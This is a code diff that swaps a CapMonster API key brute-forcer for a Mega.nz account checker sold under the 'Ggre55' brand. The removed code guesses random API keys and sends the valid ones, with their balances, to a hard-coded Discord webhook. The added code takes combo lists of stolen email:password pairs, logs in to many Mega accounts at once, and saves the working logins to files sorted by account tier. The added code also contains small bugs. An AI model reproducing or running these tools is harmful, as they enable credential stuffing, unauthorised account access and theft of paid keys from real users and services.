@@ -1,171 +1,185 @@
-import httpx
+
+# Importing required modules
 import os
-import random
-import string
 import time
-import json
-import concurrent.futures
 import logging
+from colorama import Fore, init
+from mega import Mega
+import traceback
+from concurrent.futures import ThreadPoolExecutor
 
-GENERATED_KEYS_FILE = "keys.txt"
-PROXIES_FILE = "proxies.txt"
-WEBHOOK_URL = "https://discord.com/api/webhooks/k44R5vKMuqk9HUsD5vi_7aitXmOcR"
+# Initialize colorama and logging
+init(autoreset=True)
+logging.basicConfig(level=logging.INFO, format=f"{Fore.GREEN}%(message)s{Fore.RESET}")
 
-class CapMonsterChecker:
-    def __init__(self):
-        self.keys = []
-        self.use_proxies = False
-        self.proxies = []
-        self.logger = logging.getLogger("CapMonsterChecker")
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter("[%(levelname)s] [%(asctime)s] - %(message)s")
-        ch = logging.StreamHandler()
-        ch.setFormatter(formatter)
-        self.logger.addHandler(ch)
-    
-    def generate_keys(self, num_keys, key_length):
-        chars = string.ascii_lowercase + string.digits
-        generated_keys = []
+# Initialize a set to keep track of already checked accounts
+checked_accounts = set()
+
+def clear_screen():
+    """Clear the console screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def save_valid_account(account_details, cap):
+    if cap:
+        """Save valid account details to a file."""
+        if len(account_details['balance']) == 0 :    
+            with open('valid_FREE.txt', 'a+', encoding="UTF-8") as file:
+                file.write(f"Store: =----=======================----=\n")
+                file.write(f"Author:=-----------Ggre55--------------=\n")
+                file.write(f"Store: =----ggre55store.sellpass.io----=\n")
+                file.write(f"Store: =------ggre55store.itch.io------=\n")
+                file.write(f"     : =----=======================----=\n")
+                file.write(f"Email: {account_details['email']}\n")
+                file.write(f"Password: {account_details['password']}\n")
+                file.write(f"Name: {account_details['name']}\n")
+                file.write(f"Storage: {account_details['space']}\n")
+                file.write(f"Account disk quota: {account_details['quota']}\n")
+                file.write(f"Account balance: {account_details['balance']}\n")
+                file.write("\n")
+                file.write("\n")
+        else:
+            with open('valid_PRO.txt', 'a+', encoding="UTF-8") as file:
+                file.write(f"Store: =----=======================----=\n")
+                file.write(f"Author:=-----------Ggre55--------------=\n")
+                file.write(f"Store: =----ggre55store.sellpass.io----=\n")
+                file.write(f"Store: =------ggre55store.itch.io------=\n")
+                file.write(f"     : =----=======================----=\n")
+                file.write(f"Email: {account_details['email']}\n")
+                file.write(f"Password: {account_details['password']}\n")
+                file.write(f"Name: {account_details['name']}\n")
+                file.write(f"Storage: {account_details['space']}\n")
+                file.write(f"Account disk quota: {account_details['quota']}\n")
+                file.write(f"Account balance: {account_details['balance']}\n")
+                file.write("\n")
+                file.write("\n")
+    else:
+        with open('valid.txt', 'a+', encoding="UTF-8") as file:
+            file.write(f"Store: =----=======================----=\n")
+            file.write(f"Author:=-----------Ggre55--------------=\n")
+            file.write(f"Store: =----ggre55store.sellpass.io----=\n")
+            file.write(f"Store: =------ggre55store.itch.io------=\n")
+            file.write(f"     : =----=======================----=\n")
+            file.write(f"Email: {account_details['email']}\n")
+            file.write(f"Password: {account_details['password']}\n")
+            file.write("\n")
+            file.write("\n")
+def check_account_status(email, password, cap):
+    try:
+        # Skip if the account has already been checked
+        if email in checked_accounts:
+            logging.warning(f"{Fore.YELLOW}Account {email} has already been checked. Skipping.{Fore.RESET}")
+            return None
+
+        # Log in to the Mega.nz account
+        mega = Mega()
+        m = mega.login(email, password)
         
-        for _ in range(num_keys):
-            key = ''.join(random.choice(chars) for _ in range(key_length))
-            generated_keys.append(key)
+        # Add the email to checked_accounts
+        checked_accounts.add(email)
+
+        time.sleep(1)
+
+        # Get account details
+        quota = m.get_quota()
+        account_info = m.get_user()
+        name = account_info['name']
+        email = account_info['email']
+        space = m.get_storage_space(mega=True)
+        balance = m.get_balance()
+        # Log and save the account details
+        logging.info(f"Successfully logged into account {email}.")
+
+        logging.info(f"Name: {name}, Quota: {quota}, Space: {space}")
         
-        return generated_keys
-    
-    def save_keys_to_file(self, keys):
-        with open(GENERATED_KEYS_FILE, 'w') as f:
-            for key in keys:
-                f.write(key + '\n')
-    
-    def load_keys_from_file(self):
-        if os.path.exists(GENERATED_KEYS_FILE):
-            with open(GENERATED_KEYS_FILE, 'r') as f:
-                self.keys = [line.strip() for line in f.readlines()]
-    
-    def load_proxies_from_file(self):
-        if os.path.exists(PROXIES_FILE):
-            with open(PROXIES_FILE, 'r') as f:
-                self.proxies = [line.strip() for line in f.readlines()]
-    
-    def ask_user_for_proxy_option(self):
-        answer = input("Do you want to use proxies? (y/n): ").lower()
-        self.use_proxies = answer.startswith('y')
-        if self.use_proxies:
-            self.load_proxies_from_file()  # Load proxies from the file
-    
-    def check_keys(self):
-        if not self.keys:
-            self.logger.warning("[!] No keys available. Generating new keys...")
-            self.generate_and_check_keys()
-            return
+        save_valid_account({'email': email, 'password': password, 
+                            'quota': quota, 'name': name, 
+                            'space': space, 'balance': balance,
+                            }, cap)
 
-        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
+        return {
+            "name": name,
+            "email": email,
+            "quota": quota,
+            "space": space
+        }
 
-        try:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-                while True:
-                    futures = [executor.submit(self.check_key_with_retry, key, random.choice(self.proxies) if self.use_proxies else None)
-                               for key in self.keys]
-                    concurrent.futures.wait(futures, timeout=60)
+    except Exception as e:
+        logging.error(f"{Fore.RED}Failed to log into account {email}. Error: {e}{Fore.RESET}")
+        logging.debug(traceback.format_exc())
+        return None
+    
 
-        except Exception as e:
-            self.logger.error(f"[ERROR] Exception in checker -> {e}")
-            time.sleep(60)  # Wait for 60 seconds before retrying
+banner = f"""{Fore.CYAN}
+    __  __________________       ________              __            
+   /  |/  / ____/ ____/   |     / ____/ /_  ___  _____/ /_____  _____
+  / /|_/ / __/ / / __/ /| |    / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/
+ / /  / / /___/ /_/ / ___ |   / /___/ / / /  __/ /__/ ,< /  __/ /    
+/_/  /_/_____/\____/_/  |_|   \____/_/ /_/\___/\___/_/|_|\___/_/   
+                        {Fore.RESET}{Fore.RED}BY Ggre55 {Fore.RESET}{Fore.GREEN}V2.0.5 {Fore.RESET}
+                        {Fore.YELLOW}Telegram: @DrWoop {Fore.RESET}
+                        {Fore.YELLOW}Store: ggre55store.itch.io {Fore.RESET}
+"""
 
-    def check_key_with_retry(self, key, proxy, max_retries=3):
-        retries = 0
-        while retries < max_retries:
+# Main function for user interface and functionality
+def main():
+    # Clear the console screen for better readability
+    clear_screen()
+    print(f"{banner}")
+    print("                     1. Check Accounts")
+    option = input("Select an option: ").strip()
+
+    if option == '1':
+        # Load or generate keys
+        key_file = input("Enter path to key file (leave empty to use deafault 'acc.txt'): ").strip()
+        cap = input("Full Capture 'y/n'): ").lower
+        if cap == "y":
+            cap = True
+        elif cap == "n":
+            cap = False
+        else:
+            print("Invalid option. Please try again.")
+        if key_file:
             try:
-                self.check_key(key, proxy)
+                accounts_to_check = []
+                with open(f'{key_file}', 'r') as file:
+                    print(f"Loaded {len(file)} Accounts.")  # Debug print
+                    for line in file:
+                        email, password = line.strip().split(':')
+                        accounts_to_check.append({'email': email, 'password': password})
+            except FileNotFoundError:
+                print("No accounts file. Please make sure to provide valid file.")
+                input()
                 return
-            except httpx.TimeoutException:
-                self.logger.warning(f"Timeout while checking key {key}. Retrying... ({retries + 1}/{max_retries})")
-                retries += 1
-                time.sleep(5)  # Wait for 5 seconds before retrying
-        self.logger.error(f"Failed to check key {key} after {max_retries} retries.")
+        else:
+            try:
+                accounts_to_check = []
+                with open('acc.txt', 'r') as file:
+                    for line in file:
+                        email, password = line.strip().split(':')
+                        accounts_to_check.append({'email': email, 'password': password})
+            except FileNotFoundError:
+                print("No accounts found. Please make sure to put accounts in acc.txt.")
+                input()
+                return
+        with ThreadPoolExecutor() as executor:
+            results = executor.map(lambda acc: check_account_status(acc['email'], acc['password'], cap), accounts_to_check)
 
-    def check_key(self, key, proxy):
-        proxies = {"http": proxy, "https": proxy} if proxy else None
-        try:
-            checkResp = httpx.post(
-                "https://api.capmonster.cloud/getBalance",
-                json={"clientKey": key},
-                proxies=proxies,
-                timeout=30
-            )
-            if checkResp.status_code == 200:
-                balance = checkResp.json().get('balance')
-                if balance is not None:
-                    self.logger.info(f"Valid Key: {key} | Balance: {balance}")
-                    self.send_to_discord(key, balance)
-            elif checkResp.json().get('errorCode') == "ERROR_KEY_DOES_NOT_EXIST":
-                self.logger.info(f"Invalid Key: {key}")
+        for result in results:
+            if result:
+                logging.info(f"{Fore.GREEN}Account {result['email']} checked successfully.{Fore.RESET}")
             else:
-                self.logger.error(f"Error checking key: {key} | {checkResp.status_code} | {checkResp.json()}")
-        except httpx.TimeoutException:
-            self.logger.error(f"Timeout while checking key {key}")
-        except Exception as e:
-            self.logger.error(f"Exception in checking key {key} -> {e}")
+                logging.warning(f"{Fore.YELLOW}Failed to check an account.{Fore.RESET}")
 
-    
-    def validate_proxies(self):
-        self.logger.info("Validating proxies...")
-        valid_proxies = []
-        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
-            futures = [executor.submit(self.check_key, '', proxy) for proxy in self.proxies]
-            for future in concurrent.futures.as_completed(futures):
-                proxy = future.result()
-                if proxy:
-                    valid_proxies.append(proxy)
-        self.proxies = valid_proxies
-    
-    def check_keys(self):
-        if not self.keys:
-            self.logger.warning("[!] No keys available. Generating new keys...")
-            self.generate_and_check_keys()
-            return
+    elif option == '2':
+        # Load valid proxies
+        pass
         
-        self.logger.info(f"[*] Starting checker with {len(self.keys)} keys...")
-        
-        try:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-                while True:
-                    futures = [executor.submit(self.check_key, key, random.choice(self.proxies) if self.use_proxies else None)
-                               for key in self.keys]
-                    concurrent.futures.wait(futures, timeout=60)
-        
-        except Exception as e:
-            self.logger.error(f"[ERROR] Exception in checker -> {e}")
-            time.sleep(60)  # Wait for 60 seconds before retrying
-        
-    def generate_and_check_keys(self):
-        keys = self.generate_keys(1000, 32)  # Generate 1000 new keys
-        self.save_keys_to_file(keys)
-        self.load_keys_from_file()
-        self.ask_user_for_proxy_option()  # Ask the user for proxy option
-        if self.use_proxies:
-            self.validate_proxies()
-        self.check_keys()
-    
-    def send_to_discord(self, key, balance):
-        data = {
-            "content": f"Valid Key: {key} | Balance: {balance}"
-        }
-        headers = {
-            "Content-Type": "application/json"
-        }
-        
-        try:
-            response = httpx.post(WEBHOOK_URL, json.dumps(data), headers=headers)
-            if response.status_code == 204:
-                self.logger.info("Message sent to Discord webhook")
-            else:
-                self.logger.error(f"Error sending message to Discord webhook: {response.status_code} - {response.text}")
-        except Exception as e:
-            self.logger.error(f"Exception in sending to Discord: {e}")
+    else:
+        print("Invalid option. Please try again.")
+        exit(1)
 
-if __name__ == "__main__":
-    checker = CapMonsterChecker()
-    checker.load_keys_from_file()
-    checker.check_keys()
+    print("=== Completed ===")
+    
+# Run the main function
+if __name__ == '__main__':
+    main()
